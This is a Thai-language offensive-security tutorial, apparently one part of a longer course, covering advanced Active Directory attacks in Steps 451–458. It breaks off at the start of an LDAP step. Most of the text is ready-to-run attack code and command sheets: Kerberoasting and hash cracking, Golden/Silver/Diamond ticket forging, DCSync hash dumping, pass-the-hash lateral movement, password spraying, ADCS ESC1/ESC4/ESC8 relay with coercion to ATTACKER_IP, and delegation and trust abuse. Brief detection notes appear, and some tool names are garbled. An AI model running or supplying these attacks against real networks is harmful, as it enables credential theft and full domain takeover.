# Part 46: Advanced Active Directory Attacks (Steps 451-460)

## ภาพรวม
ส่วนนี้ครอบคลุมเทคนิคการโจมตี Active Directory ขั้นสูง ตั้งแต่ Kerberoasting ไปจนถึง Golden/Silver Ticket, DCSync และ Trust Attacks

---

## Step 451: Kerberoasting Advanced

### แนวคิด
Kerberoasting คือการดึง TGS tickets สำหรับ service accounts และ crack passwords แบบ offline

```python
import subprocess
import json
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5 import constants
from impacket.krb5.types import Principal
from impacket.krb5.asn1 import TGS_REP
import hashlib
import struct
import base64

class KerberoastingAttack:
    """
    Advanced Kerberoasting attack implementation
    """
    
    def __init__(self, domain: str, dc_ip: str, username: str, password: str):
        self.domain = domain
        self.dc_ip = dc_ip
        self.username = username
        self.password = password
    
    def find_kerberoastable_accounts(self) -> list:
        """ค้นหา accounts ที่ Kerberoastable"""
        # ใช้ GetUserSPNs.py จาก Impacket
        result = subprocess.run([
            "GetUserSPNs.py",
            f"{self.domain}/{self.username}:{self.password}",
            "-dc-ip", self.dc_ip,
            "-request",
            "-outputfile", "/tmp/hashes.txt"
        ], capture_output=True, text=True)
        
        accounts = []
        for line in result.stdout.split("\n"):
            if "ServicePrincipalName" in line or "SPN" in line:
                parts = line.split()
                if len(parts) >= 2:
                    accounts.append({
                        "spn": parts[0],
                        "account": parts[1] if len(parts) > 1 else ""
                    })
        
        return accounts
    
    def extract_tgs_hashes(self) -> list:
        """ดึง TGS hashes เพื่อ crack"""
        hashes = []
        
        try:
            with open("/tmp/hashes.txt") as f:
                for line in f:
                    if "$krb5tgs$" in line:
                        hashes.append(line.strip())
        except FileNotFoundError:
            pass
        
        return hashes
    
    def crack_hashes_hashcat(self, hash_file: str, wordlist: str) -> list:
        """เคราะ hashes ด้วย hashcat"""
        result = subprocess.run([
            "hashcat",
            "-m", "13100",  # Kerberoast
            "-a", "0",      # Dictionary attack
            hash_file, wordlist,
            "--show"
        ], capture_output=True, text=True)
        
        cracked = []
        for line in result.stdout.split("\n"):
            if ":" in line and "$krb5tgs$" in line:
                parts = line.rsplit(":", 1)
                cracked.append({
                    "hash": parts[0][:50] + "...",
                    "password": parts[1]
                })
        
        return cracked
    
    def targeted_kerberoast(self, target_user: str) -> Optional[str]:
        """โจมตี Kerberoast specific user"""
        # ตั้งค่า SPN ตัวปลอม แล้วดึง ticket
        # จากนั้นลบ SPN ออก
        result = subprocess.run([
            "targetedKerberoast.py",
            "-v",
            "-d", self.domain,
            "-u", self.username,
            "-p", self.password,
            "--dc-ip", self.dc_ip,
            "--request-user", target_user
        ], capture_output=True, text=True)
        
        if "$krb5tgs$" in result.stdout:
            for line in result.stdout.split("\n"):
                if "$krb5tgs$" in line:
                    return line.strip()
        
        return None
    
    def check_etype_rc4(self) -> list:
        """ตรวจสอป accounts ที่ support RC4 (easier to crack)"""
        # RC4 (etype 23) เคราะง่ายกว่า AES
        result = subprocess.run([
            "GetUserSPNs.py",
            f"{self.domain}/{self.username}:{self.password}",
            "-dc-ip", self.dc_ip,
            "-request",
            "-outputfile", "/tmp/rc4_hashes.txt"
        ], capture_output=True, text=True)
        
        return self.extract_tgs_hashes()


KERBEROAST_COMMANDS = """
# Kerberoasting Commands

# 1. ค้นหา SPNs ด้วย Impacket
GetUserSPNs.py DOMAIN/USER:PASS -dc-ip DC_IP -request

# 2. PowerView ค้นหา SPNs
Get-NetUser -SPN -Properties SamAccountName,ServicePrincipalName

# 3. ดึง TGS tickets ด้วย Rubeus
.\\Rubeus.exe kerberoast /outfile:hashes.txt
.\\Rubeus.exe kerberoast /user:svc_sql /outfile:sql_hash.txt

# 4. crack ด้วย hashcat
hashcat -m 13100 hashes.txt rockyou.txt
hashcat -m 19600 hashes.txt rockyou.txt  # AES128
hashcat -m 19700 hashes.txt rockyou.txt  # AES256

# 5. crack ด้วย john
john --format=krb5tgs hashes.txt --wordlist=rockyou.txt

# 6. Targeted Kerberoasting (ให้สิทธิ์ GenericWrite ตั้ง SPN ให้ user)
Set-DomainObject -Identity TARGET_USER -Set @{serviceprincipalname="dummy/spn"}

# 7. AS-REP Roasting (สำหรับ accounts ที่ไม่ต้องการ pre-auth)
GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
"""

print(KERBEROAST_COMMANDS)
```

---

## Step 452: Golden Ticket and Silver Ticket Attacks

### แนวคิด
Golden Ticket ใช้ krbtgt hash สร้าง TGT ที่ valid สำหรับทุกคน Silver Ticket ใช้ service account hash สร้าง TGS

```python
import subprocess
from typing import Optional

class GoldenSilverTicket:
    """
    Golden/Silver Ticket attack implementation
    """
    
    def create_golden_ticket(
        self,
        domain: str,
        domain_sid: str,
        krbtgt_hash: str,
        username: str = "Administrator",
        user_id: int = 500
    ) -> str:
        """สร้าง Golden Ticket ด้วย mimikatz"""
        mimikatz_cmd = f"""
# Mimikatz Golden Ticket
kerberos::golden \
  /user:{username} \
  /domain:{domain} \
  /sid:{domain_sid} \
  /krbtgt:{krbtgt_hash} \
  /id:{user_id} \
  /groups:512,513,518,519,520 \
  /ticket:golden.kirbi

# Load ticket
kerberos::ptt golden.kirbi

# Test - list all DCs
ls \\\\DC01\\C$
psexec.exe \\\\DC01 cmd.exe
"""
        return mimikatz_cmd
    
    def create_silver_ticket(
        self,
        domain: str,
        domain_sid: str,
        service_hash: str,
        service_spn: str,
        target_user: str = "Administrator"
    ) -> str:
        """สร้าง Silver Ticket"""
        # Extract service and host from SPN
        parts = service_spn.split("/", 1)
        service = parts[0] if parts else "cifs"
        target_host = parts[1].split(":")[0] if len(parts) > 1 else "DC01"
        
        return f"""
# Mimikatz Silver Ticket
kerberos::golden \
  /user:{target_user} \
  /domain:{domain} \
  /sid:{domain_sid} \
  /target:{target_host} \
  /service:{service} \
  /rc4:{service_hash} \
  /ticket:silver.kirbi

kerberos::ptt silver.kirbi
"""
    
    def create_golden_ticket_impacket(
        self,
        domain: str,
        domain_sid: str,
        krbtgt_hash: str,
        username: str = "Administrator"
    ) -> str:
        """สร้าง Golden Ticket ด้วย Impacket"""
        return f"""
# Impacket ticketer.py
ticketerfr.py \
  -nthash {krbtgt_hash} \
  -domain-sid {domain_sid} \
  -domain {domain} \
  {username}

# Import ticket
export KRB5CCNAME=Administrator.ccache

# ใช้งาน
psexec.py -k -no-pass {domain}/Administrator@DC01
wmiexec.py -k -no-pass {domain}/Administrator@DC01
"""
    
    def diamond_ticket(self, dc_ip: str, domain: str, krbtgt_hash: str) -> str:
        """Diamond Ticket (ล่องหนจาก detection มากกว่า Golden Ticket)"""
        return f"""
# Diamond Ticket - modifies legitimate TGT instead of forging
# ต้องใช้ Rubeus 2.0+
.\\Rubeus.exe diamond \
  /krbkey:{krbtgt_hash} \
  /user:USER \
  /password:PASS \
  /domain:{domain} \
  /dc:{dc_ip} \
  /enctype:aes \
  /ticketuser:Administrator \
  /ticketuserid:500 \
  /groups:544
"""
    
    def sapphire_ticket(self) -> str:
        """Sapphire Ticket (ใช้ S4U2Self จาก DC)"""
        return """
# Sapphire Ticket - requests TGS from DC using S4U2Self
# ยากต่อการ detect กว่า Golden Ticket
.\\Rubeus.exe silver /krbkey:KRBTGT_AES_HASH \
  /user:USER /password:PASS \
  /domain:DOMAIN /dc:DC_IP \
  /service:krbtgt/DOMAIN \
  /ptt
"""
    
    def get_domain_info_for_golden_ticket(self, dc_ip: str, domain: str,
                                           username: str, password: str) -> dict:
        """ดึงข้อมูลที่ต้องใช้เพื่อสร้าง Golden Ticket"""
        info = {}
        
        # Get Domain SID
        result = subprocess.run([
            "lookupsid.py",
            f"{domain}/{username}:{password}@{dc_ip}",
            "0"
        ], capture_output=True, text=True)
        
        for line in result.stdout.split("\n"):
            if "Domain SID is" in line:
                info["domain_sid"] = line.split("is")[-1].strip()
        
        # Get krbtgt hash (requires DCSync or DA access)
        info["krbtgt_extraction"] = "Use secretsdump.py or DCSync to get krbtgt hash"
        info["usage"] = "Need DOMAIN_SID + krbtgt NTLM hash"
        
        return info


TICKET_DEFENSE = """
# Golden/Silver Ticket Defense

# 1. ตรวจสอบว่ามีการใช้งาน
# Event ID 4769 - Kerberos service ticket requested
# ถ้า RC4-HMAC ใน AES-enabled environment = suspicious
# Event ID 4672 - Special privileges assigned

# 2. Reset krbtgt password สองครั้ง (เพื่อ invalidate tickets)
Import-Module \"C:\\Reset-KrbtgtKeyInteractive.ps1\"
Reset-KrbtgtKeyInteractive

# 3. ตรวจสอบ anomalous tickets
# - Lifetime > 10 hours (default max)
# - Ticket ที่ไม่มีใน DC logs
# - ใช้ SID ที่ไม่ถูกต้อง

# 4. เปิดใช้ Privileged Access Workstations (PAW)
# 5. ใช้ Protected Users security group
# 6. เปิดใช้ Credential Guard
"""

print(TICKET_DEFENSE)
```

---

## Step 453: DCSync Attack

### แนวคิด
DCSync จำลองการทำงานของ DC เพื่อดึง password hashes จาก Active Directory

```python
import subprocess
import json
from typing import Optional

class DCSyncAttack:
    """
    DCSync attack implementation
    """
    
    def __init__(self, domain: str, dc_ip: str, username: str, password: str):
        self.domain = domain
        self.dc_ip = dc_ip
        self.username = username
        self.password = password
    
    def run_dcsync_secretsdump(self, target_user: str = None) -> dict:
        """รัน DCSync ด้วย secretsdump.py"""
        cmd = [
            "secretsdump.py",
            f"{self.domain}/{self.username}:{self.password}@{self.dc_ip}",
            "-just-dc",
            "-outputfile", "/tmp/dcsync_hashes"
        ]
        
        if target_user:
            cmd.extend(["-just-dc-user", target_user])
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        hashes = []
        for line in result.stdout.split("\n"):
            if ":" in line and len(line.split(":")) >= 4:
                parts = line.split(":")
                hashes.append({
                    "username": parts[0],
                    "ntlm": parts[3] if len(parts) > 3 else "",
                    "lm": parts[2] if len(parts) > 2 else ""
                })
        
        return {
            "hashes": hashes,
            "output_file": "/tmp/dcsync_hashes.ntds"
        }
    
    def check_dcsync_permissions(self) -> dict:
        """ตรวจสอบว่ามีสิทธิ์ DCSync"""
        # DCSync ต้องการสิทธิ์:
        # - Replicating Directory Changes
        # - Replicating Directory Changes All
        # - Replicating Directory Changes In Filtered Set
        
        required_rights = [
            "Replicating Directory Changes (DS-Replication-Get-Changes)",
            "Replicating Directory Changes All (DS-Replication-Get-Changes-All)",
        ]
        
        # ผู้ที่มีสิทธิ์เหล่านี้โดยปกติ:
        users_with_dcsync = [
            "Domain Admins",
            "Enterprise Admins",
            "Domain Controllers",
            "Administrators"
        ]
        
        return {
            "required_rights": required_rights,
            "typical_users": users_with_dcsync,
            "check_cmd": "Get-ObjectAcl -DistinguishedName \"DC=domain,DC=com\" -ResolveGUIDs | Where-Object {$_.ObjectType -eq \"DS-Replication-Get-Changes\"}"
        }
    
    def run_dcsync_mimikatz(self, target: str = "krbtgt") -> str:
        """DCSync command ด้วย Mimikatz"""
        return f"""
# Mimikatz DCSync
lsadump::dcsync /domain:{self.domain} /user:{target}
lsadump::dcsync /domain:{self.domain} /all /csv

# DCSync ด้วย Domain Admin context
runas /netonly /user:{self.domain}\\Administrator cmd.exe
# แล้วรัน mimikatz
mimikatz # lsadump::dcsync /domain:{self.domain} /user:krbtgt
"""
    
    def abuse_shadow_credentials(self, target_account: str, attacker_cert: str) -> str:
        """Shadow Credentials attack (Key Trust)"""
        return f"""
# Shadow Credentials - เพิ่ม Key Credentials ให้ผู้ใช้ target
# ต้องการสิทธิ์ WriteProperty บน msDS-KeyCredentialLink

# Whisker tool
.\\Whisker.exe add /target:{target_account}

# เอา certificate ที่ได้ไปรับ NTLM hash
.\\Rubeus.exe asktgt /user:{target_account} \
  /certificate:{attacker_cert} \
  /password:PASSWORD /ptt

# แปลง TGT เป็น NTLM hash (U2U)
.\\Rubeus.exe asktgs /service:host/{target_account} \
  /u2u /impersonateuser:Administrator /ptt
"""


DCSYNC_DETECTION = """
# DCSync Detection

# Event logs ที่ຕ้องตรวจสอบ:
# Event ID 4662 - Object was accessed
#   สาย Properties:
#     Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  (DS-Replication-Get-Changes)
#     Properties: {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}  (DS-Replication-Get-Changes-All)
# Event ID 4929 - Directory service was removed

# ตรวจสอบใน SIEM:
# Get-WinEvent -FilterHashTable @{LogName='Security'; Id=4662} | 
Where-Object {$_.Message -match '1131f6aa-9c07-11d1'}

# เครื่องมือตรวจจับ:
# - Microsoft Sentinel: Rule "DCSync Attack"
# - Splunk: |stats count by src_ip, dest_ip where EventCode=4662
# - Purple Knight (Semperis) - free AD security tool
"""

print(DCSYNC_DETECTION)
```

---

## Step 454: Pass-the-Hash and Pass-the-Ticket

### แนวคิด
Pass-the-Hash (PtH) และ Pass-the-Ticket (PtT) ใช้ credentials ที่อยู่ memory โดยไม่ต้องรู้ plaintext password

```python
import subprocess
from typing import Optional

class CredentialReuse:
    """
    Pass-the-Hash, Pass-the-Ticket, Over-Pass-the-Hash
    """
    
    def pass_the_hash_wmiexec(self, target: str, domain: str, 
                               username: str, ntlm_hash: str) -> str:
        """Pass-the-Hash ด้วย WMIExec"""
        return f"""
# WMIExec with PtH
wmiexec.py \
  -hashes :{ntlm_hash} \
  {domain}/{username}@{target}

# หรือใช้ CrackMapExec
crackmapexec smb {target} \
  -u {username} \
  -H {ntlm_hash}

# Execute command
crackmapexec smb {target} \
  -u {username} -H {ntlm_hash} \
  -x "whoami /all"
"""
    
    def pass_the_hash_psexec(self, target: str, domain: str,
                              username: str, ntlm_hash: str) -> str:
        """Pass-the-Hash ด้วย PSExec"""
        return f"""
# PSExec with PtH (Impacket)
psexec.py -hashes :{ntlm_hash} {domain}/{username}@{target}

# Metasploit PtH
use exploit/windows/smb/psexec
set SMBUser {username}
set SMBPass {ntlm_hash} (format: LM:NT)
set RHOSTS {target}
run

# mimikatz sekurlsa::pth (Windows)
sekurlsa::pth /user:{username} /domain:{domain} /ntlm:{ntlm_hash} /run:cmd.exe
"""
    
    def pass_the_ticket(self, kirbi_file: str) -> str:
        """Pass-the-Ticket (inject Kerberos ticket)"""
        return f"""
# Pass-the-Ticket ด้วย Mimikatz
kerberos::ptt {kirbi_file}

# หรือ Rubeus
.\\Rubeus.exe ptt /ticket:{kirbi_file}
.\\Rubeus.exe ptt /ticket:BASE64_TICKET

# Import ticket บน Linux
export KRB5CCNAME=/tmp/stolen.ccache
impacket-psexec -k -no-pass DOMAIN/USER@TARGET
"""
    
    def over_pass_the_hash(self, domain: str, username: str, ntlm_hash: str) -> str:
        """Over-Pass-the-Hash (ใช้ NTLM hash สร้าง Kerberos ticket)"""
        return f"""
# Over-Pass-the-Hash / Pass-the-Key
# ใช้ NTLM hash เพื่อขอ Kerberos TGT

# Mimikatz
sekurlsa::pth /user:{username} /domain:{domain} /ntlm:{ntlm_hash} /run:"klist purge"

# Rubeus
.\\Rubeus.exe asktgt /user:{username} /rc4:{ntlm_hash} /domain:{domain} /ptt

# Impacket
getTGT.py {domain}/{username} -hashes :{ntlm_hash}
export KRB5CCNAME={username}.ccache
psexec.py -k -no-pass {domain}/{username}@DC01
"""
    
    def extract_tickets_from_memory(self) -> str:
        """Extract tickets จาก Windows memory"""
        return """
# Dump all Kerberos tickets

# Mimikatz
sekurlsa::tickets /export  # save as .kirbi
kerberos::list /export

# Rubeus
.\\Rubeus.exe dump
.\\Rubeus.exe dump /luid:0x3e4  # specific logon session
.\\Rubeus.exe dump /service:krbtgt  # TGTs only

# klist command
klist
klist -li 0x3e4  # specific session
"""


# Lateral movement with credentials
LATERAL_MOVEMENT = """
# Lateral Movement Techniques

# 1. SMB (PsExec style)
crackmapexec smb 10.10.10.0/24 -u admin -H NTLM_HASH
psexec.py domain/admin:password@TARGET

# 2. WMI
wmiexec.py domain/admin:password@TARGET "whoami"
Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami"

# 3. PowerShell Remoting
Enter-PSSession -ComputerName TARGET -Credential CREDS
Invoke-Command -ComputerName TARGET -ScriptBlock { id }

# 4. DCOM
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami",'7')

# 5. RDP
xfreerdp /v:TARGET /u:admin /p:password
mimikatz: privilege::debug; sekurlsa::logonpasswords

# 6. SSH (ถ้าเปิด)
ssh -i stolen_key user@TARGET

# 7. Evil-WinRM
evil-winrm -i TARGET -u admin -H NTLM_HASH

# 8. ใช้ CrackMapExec spray credentials
crackmapexec smb NETWORK/24 -u admin_list.txt -p 'Summer2024!'
crackmapexec smb NETWORK/24 -u admin -H HASH --local-auth
"""

print(LATERAL_MOVEMENT)
```

---

## Step 455: Active Directory Certificate Services (ADCS) Attacks

### แนวคิด
ADCS มีช่องโหว่มากมายที่ SpecterOps เรียกว่า ESC1-ESC8 ซึ่งสามารถใช้เพื่อ escalate ไปเป็น Domain Admin

```python
import subprocess
from typing import Optional

class ADCSAttacker:
    """
    Active Directory Certificate Services (ADCS) attacks
    """
    
    def enumerate_certificate_templates(self, domain: str, dc_ip: str,
                                         username: str, password: str) -> list:
        """ค้นหา vulnerable certificate templates"""
        result = subprocess.run([
            "certipy", "find",
            "-u", f"{username}@{domain}",
            "-p", password,
            "-dc-ip", dc_ip,
            "-vulnerable",
            "-stdout"
        ], capture_output=True, text=True)
        
        templates = []
        current_template = {}
        
        for line in result.stdout.split("\n"):
            if "Template Name" in line:
                if current_template:
                    templates.append(current_template)
                current_template = {"name": line.split(":")[-1].strip()}
            elif "Vulnerability" in line:
                current_template["vulnerability"] = line.split(":")[-1].strip()
            elif "Client Authentication" in line:
                current_template["client_auth"] = "True" in line
        
        if current_template:
            templates.append(current_template)
        
        return templates
    
    def exploit_esc1(self, domain: str, dc_ip: str, username: str, 
                      password: str, template: str, ca: str,
                      target_upn: str = "Administrator@domain.com") -> str:
        """โจมตี ESC1 - Misconfigured Certificate Templates"""
        return f"""
# ESC1 - Certificate Template allows client auth + Subject Alternative Name
# Attacker กำหนด SAN เป็นผู้ใช้คนอื่น

# Request certificate ด้วย Certipy
certipy req \
  -u {username}@{domain} \
  -p {password} \
  -ca {ca} \
  -template {template} \
  -upn {target_upn} \
  -dc-ip {dc_ip}

# ใช้ certificate เพื่อดึง hash
certipy auth \
  -pfx Administrator.pfx \
  -dc-ip {dc_ip}
"""
    
    def exploit_esc4(self, domain: str, dc_ip: str, username: str,
                      password: str, template: str, ca: str) -> str:
        """โจมตี ESC4 - Vulnerable Template ACL"""
        return f"""
# ESC4 - Template ACL ให้ผู้ใช้เขียน template ได้

# เปลี่ยน template ให้เป็น ESC1 vulnerable
certipy template \
  -u {username}@{domain} \
  -p {password} \
  -template {template} \
  -save-old \
  -dc-ip {dc_ip}

# แล้วทำ ESC1 attack
certipy req \
  -u {username}@{domain} \
  -p {password} \
  -ca {ca} \
  -template {template} \
  -upn administrator@{domain} \
  -dc-ip {dc_ip}

# Restore template
certipy template \
  -u {username}@{domain} \
  -p {password} \
  -template {template} \
  -configuration old_template.json
"""
    
    def exploit_esc8_ntlm_relay(self, ca_server: str) -> str:
        """โจมตี ESC8 - NTLM Relay to ADCS HTTP Enrollment"""
        return f"""
# ESC8 - CA เปิด HTTP enrollment endpoint
# NTLM relay ไปยัง /certsrv/ เพื่อ request certificate ในนาม DC

# ขั้นตอนที่ 1: เริ่ม ntlmrelayx
ntlmrelayx.py \
  -t http://{ca_server}/certsrv/certfnsh.asp \
  --adcs \
  --template DomainController

# ขั้นตอนที่ 2: บังคับ DC authentication
# PetitPotam
petitpotam.py ATTACKER_IP DC_IP

# Coerce authentication with Coercer
python3 Coercer.py coerce \
  -l ATTACKER_IP \
  -t DC_IP \
  -u USER -p PASS

# ขั้นตอนที่ 3: ใช้ certificate ที่ได้รับ
certipy auth \
  -pfx dc.pfx \
  -dc-ip DC_IP
"""


ADCS_TOOLS = """
# ADCS Security Tools

# 1. Certipy - ADCS enumeration and exploitation
pip install certipy-ad

# Enumerate
certipy find -u user@domain.com -p pass -dc-ip IP -vulnerable
certipy find -u user@domain.com -p pass -dc-ip IP -stdout

# Request certificate
certipy req -u user@domain.com -p pass -ca CA_NAME -template Template

# Authenticate with certificate
certipy auth -pfx cert.pfx -dc-ip IP

# 2. Certify (C# tool)
.\\Certify.exe find /vulnerable
.\\Certify.exe request /ca:DC\\CA /template:Template /altname:administrator

# 3. PSPKIAudit - PowerShell audit tool
Import-Module PSPKIAudit
Get-AuditCertificateTemplate
Get-AuditCertificationAuthority

# 4. PKI Secrets - BloodHound extension
# ดู ADCS paths ใน BloodHound
"""

print(ADCS_TOOLS)
```

---

## Step 456: BloodHound and Attack Path Analysis

### แนวคิด
BloodHound วิเคราะห์การเชื่อมโยง Active Directory เพื่อหา attack paths ไปยัง Domain Admin

```python
import subprocess
import json
import requests
from typing import Optional

class BloodHoundAnalyzer:
    """
    วิเคราะห์ข้อมูล BloodHound
    """
    
    def __init__(self, neo4j_url: str = "http://localhost:7474",
                 username: str = "neo4j", password: str = "BloodHound"):
        self.neo4j_url = neo4j_url
        self.auth = (username, password)
    
    def run_query(self, cypher: str) -> list:
        """รัน Cypher query ใน BloodHound Neo4j"""
        try:
            resp = requests.post(
                f"{self.neo4j_url}/db/neo4j/tx/commit",
                auth=self.auth,
                json={"statements": [{"statement": cypher}]},
                headers={"Content-Type": "application/json"}
            )
            if resp.status_code == 200:
                data = resp.json()
                results = data.get("results", [{}])[0]
                return results.get("data", [])
        except Exception:
            pass
        return []
    
    def find_shortest_path_to_da(self, start_user: str) -> list:
        """หา path สั้นสุดไปยัง Domain Admin"""
        cypher = f"""
MATCH p=shortestPath(
  (u:User {{name:"{start_user}"}})-[*1..]->(g:Group {{name:"DOMAIN ADMINS@DOMAIN.COM"}})
)
RETURN p
"""
        return self.run_query(cypher)
    
    def find_kerberoastable_da_path(self) -> list:
        """หา Kerberoastable accounts ที่มี path ไป DA"""
        cypher = """
MATCH (u:User {hasspn: true})
MATCH p=shortestPath((u)-[*1..]->(g:Group {name: "DOMAIN ADMINS@DOMAIN.COM"}))
RETURN u.name, length(p) as hops
ORDER BY hops ASC
LIMIT 20
"""
        return self.run_query(cypher)
    
    def find_asreproastable_paths(self) -> list:
        """หา AS-REP Roastable accounts"""
        cypher = """
MATCH (u:User {dontreqpreauth: true})
OPTIONAL MATCH p=shortestPath((u)-[*1..]->(g:Group {name: "DOMAIN ADMINS@DOMAIN.COM"}))
RETURN u.name, u.description, p
LIMIT 20
"""
        return self.run_query(cypher)
    
    def find_owned_path_to_da(self, owned_users: list) -> list:
        """หา path จาก owned users ไป DA"""
        owned_str = ", ".join([f'"{u}"' for u in owned_users])
        cypher = f"""
MATCH (u:User) WHERE u.name IN [{owned_str}]
MATCH p=shortestPath((u)-[*1..]->(g:Group {{name: "DOMAIN ADMINS@DOMAIN.COM"}}))
RETURN u.name, g.name, length(p) as hops
ORDER BY hops
"""
        return self.run_query(cypher)
    
    def find_dcsync_users(self) -> list:
        """หา users ที่มีสิทธิ์ DCSync"""
        cypher = """
MATCH p=(u:User)-[:GetChangesAll|GetChanges*1..]->(d:Domain)
RETURN u.name, d.name
"""
        return self.run_query(cypher)
    
    def find_high_value_targets(self) -> list:
        """หา high value targets"""
        cypher = """
MATCH (n) WHERE n.highvalue=true
RETURN n.name, labels(n) as type
LIMIT 20
"""
        return self.run_query(cypher)
    
    def generate_attack_report(self) -> str:
        """สร้างรายงาน"""
        report = ["=" * 60]
        report.append("BLOODHOUND ATTACK PATH ANALYSIS")
        report.append("=" * 60)
        
        # High value targets
        hvt = self.find_high_value_targets()
        report.append(f"\nHigh Value Targets: {len(hvt)}")
        
        # Kerberoastable paths
        kerb = self.find_kerberoastable_da_path()
        report.append(f"\nKerberoastable paths to DA: {len(kerb)}")
        
        # DCSync users
        dcsync = self.find_dcsync_users()
        report.append(f"\nUsers with DCSync rights: {len(dcsync)}")
        
        return "\n".join(report)


BLOODHOUND_SETUP = """
# BloodHound Setup and Usage

# 1. ติดตั้ง BloodHound
docker run -d \
  -p 7474:7474 -p 7687:7687 \
  --env NEO4J_AUTH=neo4j/BloodHound \
  neo4j:4.4

# 2. เก็บข้อมูล AD
# SharpHound (Windows)
.\\SharpHound.exe -c All --zipfilename bh_data.zip

# BloodHound.py (Linux - ทำงานจาก network)
bloodhound-python \
  -u USER@DOMAIN \
  -p PASSWORD \
  -c All \
  -d DOMAIN \
  --dns-tcp -ns DC_IP

# 3. Import data
# ลาก zip file ไปยัง BloodHound UI

# 4. Custom Cypher Queries
# หา Users ที่เป็น Admin บนคอมหลายเครื่อง
MATCH (u:User)-[r:AdminTo]->(c:Computer)
WITH u, count(r) as adminCount
WHERE adminCount > 10
RETURN u.name, adminCount ORDER BY adminCount DESC

# หา Computers ที่ Unconstrained Delegation
MATCH (c:Computer {unconstraineddelegation: true})
RETURN c.name

# หา ACL Abuse paths
MATCH p=(u:User)-[r:GenericWrite|WriteOwner|WriteDacl|AddMember]->(t)
RETURN u.name, type(r), t.name
LIMIT 20
"""

print(BLOODHOUND_SETUP)
```

---

## Step 457: Domain Trust Attacks

### แนวคิด
การโจมตีผ่าน domain trusts ช่วยให้ lateral movement ข้าม domain/forest boundaries

```python
import subprocess
from typing import Optional

class DomainTrustAttacks:
    """
    Domain Trust exploitation techniques
    """
    
    def enumerate_trusts(self, domain: str, dc_ip: str,
                          username: str, password: str) -> list:
        """ค้นหา domain trusts"""
        result = subprocess.run([
            "ldapdomaindump",
            f"ldap://{dc_ip}",
            "-u", f"{domain}\\{username}",
            "-p", password,
            "-o", "/tmp/ldap_dump"
        ], capture_output=True, text=True)
        
        # Also use PowerView
        powerview_commands = [
            "Get-NetDomainTrust",
            "Get-NetForestTrust",
            "Get-NetForestDomain",
            "Invoke-MapDomainTrust"
        ]
        
        return {
            "commands": powerview_commands,
            "output_dir": "/tmp/ldap_dump"
        }
    
    def exploit_sid_history(self, child_domain: str, parent_domain: str,
                             child_krbtgt_hash: str, enterprise_admin_sid: str) -> str:
        """SID History injection cross-domain"""
        return f"""
# SID History Injection - cross-domain privilege escalation
# ใช้ krbtgt hash ของ child domain สร้าง Ticket พร้อม SID ของ Parent Domain

# ขั้นตอนที่ 1: หา SID ของ Enterprise Admins group
Get-NetGroup "Enterprise Admins" -Domain {parent_domain} | Select-Object SID
# Enterprise Admins SID: {enterprise_admin_sid}

# ขั้นตอนที่ 2: ดึง krbtgt hash ของ child domain
lsadump::dcsync /domain:{child_domain} /user:krbtgt

# ขั้นตอนที่ 3: สร้าง Inter-Realm ticket ด้วย extra SID
kerberos::golden \
  /user:Administrator \
  /domain:{child_domain} \
  /sid:CHILD_DOMAIN_SID \
  /krbtgt:{child_krbtgt_hash} \
  /sids:{enterprise_admin_sid} \
  /ticket:cross_domain.kirbi

# ขั้นตอนที่ 4: ใช้ ticket เข้าถึง parent domain
kerberos::ptt cross_domain.kirbi
ls \\\\PARENT_DC\\C$
"""
    
    def exploit_unconstrained_delegation(self, dc_ip: str, domain: str,
                                          target_spn: str) -> str:
        """Unconstrained Delegation attack"""
        return f"""
# Unconstrained Delegation - เครื่องที่มี Unconstrained Delegation จะหายใจใน memory
# เมื่อ users/computers connect มา

# ขั้นตอนที่ 1: หา computers ที่ Unconstrained Delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-NetComputer -Unconstrained

# ขั้นตอนที่ 2: บังคับ DC authenticate ไปยัง เครื่องที่ compromised
# PetitPotam
python3 PetitPotam.py COMPROMISED_MACHINE DC_IP -u USER -p PASS

# SpoolSample (PrinterBug)
SpoolSample.exe DC_IP COMPROMISED_MACHINE

# ขั้นตอนที่ 3: ดึง ticket จาก memory
.\\Rubeus.exe monitor /interval:5
# Rubeus จะ capture TGT ของ DC account

# ขั้นตอนที่ 4: DCSync ด้วย DC TGT
kerberos::ptt DC_TGT.kirbi
mimikatz lsadump::dcsync /domain:{domain} /user:krbtgt
"""
    
    def constrained_delegation_attack(self, service_account: str, spn: str,
                                        target_user: str, domain: str) -> str:
        """Constrained Delegation attack (S4U2Self/S4U2Proxy)"""
        return f"""
# Constrained Delegation Attack
# Service account ที่มี SeEnableDelegationPrivilege สามารถ impersonate ผู้ใช้อื่น

# ขั้นตอนที่ 1: ขอ TGS สำหรับ target user (S4U2Self)
.\\Rubeus.exe s4u \
  /user:{service_account} \
  /rc4:SERVICE_HASH \
  /impersonateuser:{target_user} \
  /msdsspn:{spn} \
  /domain:{domain} \
  /ptt

# Alternative: Impacket
getST.py -spn {spn} \
  -impersonate {target_user} \
  {domain}/{service_account} \
  -hashes :SERVICE_HASH

export KRB5CCNAME={target_user}.ccache
psexec.py -k -no-pass {domain}/{target_user}@TARGET
"""


TRUST_ENUMERATION = """
# Domain Trust Enumeration

# PowerShell
Get-NetDomainTrust | Select-Object SourceName, TargetName, TrustDirection, TrustType
Get-NetForestTrust
Get-DomainTrust -Domain child.parent.com

# nltest
nltest /trusted_domains
nltest /dclist:DOMAIN

# ADExplorer
# ldp.exe

# Impacket
lookupsid.py DOMAIN/USER:PASS@DC_IP 0

# BloodHound ดู trust relationships
MATCH (d:Domain)-[r:TrustedBy]->(d2:Domain)
RETURN d.name, type(r), d2.name

# Attack Paths ผ่าน trusts
MATCH p=shortestPath(
  (u:User {domain: "CHILD.PARENT.COM"})-[*1..]->
  (g:Group {name: "DOMAIN ADMINS@PARENT.COM"})
)
RETURN p
"""

print(TRUST_ENUMERATION)
```

---

## Step 458: LDAP Enumeration and Exploitation

### แนวคิด
LDAP สามารถใช้เพื่อค้นหาข้อมูล AD ทั้งหมด รวมถึง users, groups, computers และ policies

```python
